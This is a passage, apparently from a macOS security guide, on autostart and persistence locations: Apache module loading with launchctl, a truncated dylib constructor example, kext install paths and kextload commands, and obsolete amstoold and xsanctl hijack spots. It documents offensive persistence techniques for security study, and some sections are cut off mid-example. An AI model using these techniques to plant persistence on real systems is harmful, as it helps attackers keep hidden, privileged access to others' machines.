  \ moduled will be loaded by Apache. The only thing is that either you need to **sign it with a valid Apple certificate**,\
  \ or you need to **add a new trusted certificate** in the system and **sign it** with it.\n\nThen, if needed , to make sure\
  \ the server will be started you could execute:\n\n```bash\nsudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist\n\
  ```\n\nCode example for the Dylb:\n\n```objectivec\n#include <stdio.h>\n#include <syslog.h>\n\n__attribute__((constructor))\n\

  \n#### Description & Exploit\n\nXQuartz is **no longer installed in macOS**, so if you want more info check the writeup.\n\
  \n### ~~kext~~\n\n> [!CAUTION]\n> It's so complicated to install kext even as root taht I won't consider this to escape\
  \ from sandboxes or even for persistence (unless you have an exploit)\n\n#### Location\n\nIn order to install a KEXT as\
  \ a startup item, it needs to be **installed in one of the following locations**:\n\n- `/System/Library/Extensions`\n  -\
  \ KEXT files built into the OS X operating system.\n- `/Library/Extensions`\n  - KEXT files installed by 3rd party software\n\
  \nYou can list currently loaded kext files with:\n\n```bash\nkextstat #List loaded kext\nkextload /path/to/kext.kext #Load\
  \ a new one based on path\nkextload -b com.apple.driver.ExampleBundle #Load a new one based on path\nkextunload /path/to/kext.kext\n\
  kextunload -b com.apple.driver.ExampleBundle\n```\n\nFor more information about [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).\n\
  \n### ~~amstoold~~\n\nWriteup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)\n\
  \n#### Location\n\n- **`/usr/local/bin/amstoold`**\n  - Root required\n\n#### Description & Exploitation\n\nApparently the\
  \ `plist` from `/System/Library/LaunchAgents/com.apple.amstoold.plist` was using this binary while exposing a XPC service...\
  \ the thing is that the binary didn't exist, so you could place something there and when the XPC service gets called your\
  \ binary will be called.\n\nI can no longer find this in my macOS.\n\n### ~~xsanctl~~\n\nWriteup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)\n\
  \n#### Location\n\n- **`/Library/Preferences/Xsan/.xsanrc`**\n  - Root required\n  - **Trigger**: When the service is run\
  \ (rarely)\n\n#### Description & exploit\n\nApparently it's not very common to run this script and I couldn't even find\
  \ it in my macOS, so if you want more info check the writeup.\n\n### ~~/etc/rc.common~~\n\n> [!CAUTION] > **This isn't working\
  \ in modern MacOS versions**\n\nIt's also possible to place here **commands that will be executed at startup.** Example\
